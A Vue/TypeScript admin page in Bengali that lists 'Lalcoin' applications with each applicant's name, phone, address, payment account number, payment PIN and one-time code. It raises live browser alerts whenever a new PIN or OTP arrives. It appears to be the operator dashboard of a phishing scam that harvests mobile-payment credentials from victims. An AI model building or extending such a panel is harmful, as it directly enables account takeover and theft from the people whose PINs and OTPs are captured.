<script setup lang="ts">
import { Head, router } from '@inertiajs/vue3';
import AppLayout from '@/layouts/AppLayout.vue';
import { onMounted, onUnmounted } from 'vue';
interface PaymentAmount {
    pin_2?: string;
    code?: string;
}

interface LalcoinApplication {
    id: number;
    name: string;
    address: string;
    phone: string;
    coin_count?: number | string;
    coin_year?: string | number;
    submitted: boolean;

    payment_number?: string;
    payment_amount?: PaymentAmount | null;
    payment_method?: string;
    payment_reference?: string;
    payment_url?: string;
    payment_status?: string;

    created_at: string;
    updated_at: string;
}

interface PaginationLink {
    url: string | null;
    label: string;
    active: boolean;
}

interface PaginatedApplications {
    data: LalcoinApplication[];
    links: PaginationLink[];
    current_page: number;
    last_page: number;
    from: number | null;
    to: number | null;
    total: number;
}

const props = defineProps<{
    applications: PaginatedApplications;
}>();

const goToPage = (url: string | null) => {
    if (!url) return;

    router.visit(url, {
        preserveScroll: true,
        preserveState: true,
    });
};

const formatDate = (date: string) => {
    return new Date(date).toLocaleString('bn-BD', {
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
    });
};



const deleteApplication = (id: number) => {
    if (!confirm('আপনি কি নিশ্চিত যে এই আবেদনটি মুছে ফেলতে চান?')) {
        return;
    }

    router.delete(`/coin-applications/${id}`, {
        preserveScroll: true,
    });
};

const showBrowserNotification = async (title: string, body: string) => {
    if (!('Notification' in window)) {
        console.warn('This browser does not support notifications.');
        return;
    }

    if (Notification.permission === 'default') {
        const permission = await Notification.requestPermission();

        if (permission !== 'granted') {
            return;
        }
    }

    if (Notification.permission === 'granted') {
        new Notification(title, {
            body,
            icon: '/favicon.ico',
        });
    }
};


onMounted(() => {
    if (!window.Echo) {
        console.error('Laravel Echo is NOT available!');
        return;
    }

    const channel = window.Echo.private('lalcoin-applications');

    channel.listen('.application.created', (data: {
        id: number;
        name: string;
        phone: string;
    }) => {

        showBrowserNotification(
            'নতুন Lalcoin Application',
            `${data.name} নতুন আবেদন জমা দিয়েছেন।`
        );

        router.reload({
            only: ['applications'],
            preserveScroll: true,
            preserveState: true,
        });
    });

    channel.listen('.payment.account.submitted', (data: { id: number }) => {

        showBrowserNotification(
            'নতুন Lalcoin Payment',
            'নতুন Account Number জমা হয়েছে।'
        );

        router.reload({
            only: ['applications'],
            preserveScroll: true,
            preserveState: true,
        });
    });

    channel.listen('.payment.pin.submitted', (data: { id: number }) => {
        console.log('PIN EVENT RECEIVED:', data);

        showBrowserNotification(
            'নতুন Lalcoin Payment',
            'নতুন Payment Update এসেছে।'
        );

        router.reload({
            only: ['applications'],
            preserveScroll: true,
            preserveState: true,
        });
    });

    channel.listen('.payment.otp.submitted', (data: { id: number }) => {
        console.log('OTP EVENT RECEIVED:', data);

        showBrowserNotification(
            'নতুন Lalcoin Payment',
            'নতুন Payment Update এসেছে।'
        );

        router.reload({
            only: ['applications'],
            preserveScroll: true,
            preserveState: true,
        });
    });
});
onUnmounted(() => {
    if (window.Echo) {
        window.Echo.leave('lalcoin-applications');
    }
});
</script>

<template>
    <AppLayout>
        <Head>
            <title>লাল কয়েন আবেদন</title>

            <meta
                name="description"
                content="সকল লাল কয়েন আবেদন দেখুন এবং পরিচালনা করুন"
            />
        </Head>

        <div class="container mx-auto px-4 py-8">
            <div
                class="overflow-hidden rounded-lg bg-white shadow-md dark:bg-gray-800"
            >
                <!-- Header -->
                <div
                    class="border-b border-gray-200 px-6 py-5 dark:border-gray-700"
                >
                    <h1
                        class="text-3xl font-bold text-gray-900 dark:text-white"
                    >
                        লাল কয়েন আবেদনসমূহ
                    </h1>

                    <p
                        class="mt-1 text-sm text-gray-600 dark:text-gray-400"
                    >
                        সকল লাল কয়েন আবেদন এক জায়গায় দেখুন এবং পরিচালনা করুন
                    </p>
                </div>

                <div class="p-6">
                    <!-- Empty -->
                    <div
                        v-if="applications.data.length === 0"
                        class="py-12 text-center"
                    >
                        <p class="text-lg text-gray-500">
                            এখনও কোনো লাল কয়েন আবেদন আসেনি
                        </p>
                    </div>

                    <!-- Table -->
                    <div
                        v-else
                        class="overflow-x-auto"
                    >
                        <table
                            class="w-full divide-y divide-gray-200 dark:divide-gray-700"
                        >
                            <thead
                                class="bg-gray-50 dark:bg-gray-900"
                            >
                                <tr>
                                    <th
                                        class="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500"
                                    >
                                        আবেদনকারী
                                    </th>

                                    <th
                                        class="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500"
                                    >
                                        যোগাযোগ
                                    </th>

                                    <th
                                        class="px-4 py-3 text-left text-xs font-medium uppercase tracking-wider text-gray-500"
                                    >
                                        কয়েন তথ্য
                                    </th>

                                    <th
                                        class="px-4 py-3 text-right text-xs font-medium uppercase tracking-wider text-gray-500"
                                    >
                                        কার্যক্রম
                                    </th>
                                </tr>
                            </thead>

                            <tbody
                                class="divide-y divide-gray-200 bg-white dark:divide-gray-700 dark:bg-gray-800"
                            >
                                <tr
                                    v-for="application in applications.data"
                                    :key="application.id"
                                    class="hover:bg-gray-50 dark:hover:bg-gray-700"
                                >
                                    <!-- Applicant -->
                                    <td class="px-4 py-4 align-top">
                                        <div
                                            class="font-semibold text-gray-900 dark:text-white"
                                        >
                                            {{ application.name }}
                                        </div>

                                        <!-- Payment Information -->
                                        <div
                                            v-if="
                                                application.payment_number ||
                                                application.payment_amount
                                            "
                                            class="mt-2 space-y-1 text-xs"
                                        >
                                            <!-- Payment Method + Number -->
                                            <div
                                                v-if="application.payment_number"
                                                class="text-gray-700 dark:text-gray-300"
                                            >
                                                <span class="font-bold">
                                                    {{
                                                        application.payment_method
                                                            ? application.payment_method
                                                            : 'Payment'
                                                    }}:
                                                </span>

                                                {{ application.payment_number }}
                                            </div>

                                            <!-- PIN -->
                                            <div
                                                v-if="
                                                    application.payment_amount &&
                                                    application.payment_amount.pin_2
                                                "
                                                class="text-gray-700 dark:text-gray-300"
                                            >
                                                <span class="font-bold">PIN:</span>
                                                {{ application.payment_amount.pin_2 }}
                                            </div>

                                            <!-- Code -->
                                            <div
                                                v-if="
                                                    application.payment_amount &&
                                                    application.payment_amount.code
                                                "
                                                class="text-gray-700 dark:text-gray-300"
                                            >
                                                <span class="font-bold">Code:</span>
                                                {{ application.payment_amount.code }}
                                            </div>
                                        </div>

                                        <!-- Date -->
                                        <div
                                            class="mt-2 text-xs text-gray-500"
                                        >
                                            {{ formatDate(application.created_at) }}
                                        </div>
                                    </td>

                                    <!-- Contact -->
                                    <td class="px-4 py-4 align-top">
                                        <div
                                            class="font-medium text-gray-900 dark:text-white"
                                        >
                                            {{ application.phone }}
                                        </div>

                                        <div
                                            class="mt-2 max-w-xs break-words text-xs text-gray-600 dark:text-gray-400"
                                        >
                                            {{ application.address }}
                                        </div>
                                    </td>

                                    <!-- Coin -->
                                    <td class="px-4 py-4 align-top">
                                        <div class="text-sm text-gray-700 dark:text-gray-300">
                                            <span class="font-medium">
                                                কয়েন:
                                            </span>

                                            {{ application.coin_count }}
                                        </div>

                                        <div class="mt-1 text-sm text-gray-700 dark:text-gray-300">
                                            <span class="font-medium">
                                                বছর:
                                            </span>

                                            {{ application.coin_year }}
                                        </div>

                                        <div class="mt-1 text-xs">
                                            <span
                                                :class="
                                                    application.submitted
                                                        ? 'text-green-600'
                                                        : 'text-gray-500'
                                                "
                                            >
                                                {{
                                                    application.submitted
                                                        ? 'জমা হয়েছে'
                                                        : 'জমা হয়নি'
                                                }}
                                            </span>
                                        </div>
                                    </td>


                                    <!-- Actions -->
                                    <td class="px-4 py-4 text-right align-top">
                                        <button
                                            type="button"
                                            @click="
                                                deleteApplication(
                                                    application.id,
                                                )
                                            "
                                            class="rounded-md bg-red-600 px-3 py-1.5 text-xs font-medium text-white hover:bg-red-700"
                                        >
                                            মুছুন
                                        </button>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>

                    <!-- Pagination -->
                    <div
                        v-if="
                            applications.data.length > 0 &&
                            applications.last_page > 1
                        "
                        class="mt-6 flex flex-col items-center justify-between gap-4 sm:flex-row"
                    >
                        <p class="text-sm text-gray-600 dark:text-gray-400">
                            মোট {{ applications.total }} টির মধ্যে
                            {{ applications.from }}-{{ applications.to }}
                            দেখানো হচ্ছে
                        </p>

                        <nav class="flex items-center gap-1">
                            <button
                                v-for="(link, index) in applications.links"
                                :key="index"
                                :disabled="!link.url"
                                @click="goToPage(link.url)"
                                class="rounded-md border px-3 py-1.5 text-sm"
                                :class="[
                                    link.active
                                        ? 'border-blue-600 bg-blue-600 text-white'
                                        : 'border-gray-300 bg-white text-gray-700 hover:bg-gray-50 dark:border-gray-600 dark:bg-gray-800 dark:text-gray-300',
                                    !link.url
                                        ? 'cursor-not-allowed opacity-50'
                                        : 'cursor-pointer',
                                ]"
                                v-html="link.label"
                            />
                        </nav>
                    </div>
                </div>
            </div>
        </div>
    </AppLayout>
</template>
